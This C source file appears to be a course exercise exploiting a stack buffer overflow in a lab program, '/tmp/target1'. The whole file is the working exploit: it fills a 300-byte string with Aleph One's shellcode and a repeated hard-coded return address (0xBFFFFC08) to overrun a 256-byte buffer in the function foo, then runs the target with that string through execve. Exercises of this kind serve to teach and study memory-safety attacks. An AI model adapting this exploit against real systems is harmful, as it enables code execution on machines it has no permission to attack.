#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define EGG_SIZE 300 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  long buffAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  char *ptr;
  int i;

  buffAddr = 0xBFFFFC08; /* start address of buf in target1.c:foo */
  
  /* First fill the exploit string with the address of the buf in foo. 
     This will ensure that we overwrite the return address with the 
     start address of our code */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = buffAddr;
  
  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  ptr = egg;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  args[1] = egg;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
